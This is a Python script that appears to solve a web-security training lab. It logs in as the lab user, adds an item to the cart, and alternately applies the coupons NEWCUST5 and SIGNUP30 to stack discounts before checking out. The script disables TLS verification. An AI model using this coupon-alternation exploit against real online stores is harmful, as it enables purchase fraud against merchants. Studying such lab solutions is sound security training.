import requests
import sys
import urllib3
from bs4 import BeautifulSoup 

import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'})['value']
    return csrf

def buy_item(s, url):
    #Login to the user account 
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("Loggin as the user")
    data_login= {"csrf": csrf_token, "username":"wiener", "password":"peter"}
    r= s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("User has been logged in successfully")

        #Add Jacket to cart 
        cart_url= url + "/cart"
        data_cart= {"productId":"1", "redir":"PRODUCT", "quantity":"1"}
        r = s.post(cart_url, data=data_cart, verify=False, proxies=proxies)

        #Add coupons
        coupon_url = url + "/cart/coupon"
        for i in range(9):
            if i % 2:
                csrf_token = get_csrf_token(s, cart_url)
                data_newcust5= {"csrf": csrf_token, "coupon":"NEWCUST5"}
                r = s.post(coupon_url, data=data_newcust5, verify=False, proxies=proxies)

            else:
                csrf_token = get_csrf_token(s, cart_url)
                data_signup30= {"csrf": csrf_token, "coupon":"SIGNUP30"}
                r = s.post(coupon_url, data=data_signup30, verify=False, proxies=proxies)
        #checkout
        checkout_url = url + "/cart/checkout"
        csrf_token= get_csrf_token(s, cart_url)
        data_checkout={"csrf":csrf_token}
        r= s.post(checkout_url, data=data_checkout, verify=False, proxies=proxies)
           
        #Check if the lab is solved
        if "Congratulations" in r.text:
            print("Successfully solved the lab")
        else:
            print("Unable to solve the lab")
            sys.exit(-1)        

    else:
        print("Unable to log in as user")
        sys.exit(-1)



def main():
    if len(sys.argv)!= 2:
        print("Usage: %s <url>" %sys.argv[0])
        print("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    s= requests.Session()
    url= sys.argv[1]
    buy_item(s, url)


if __name__=="__main__":
    main()

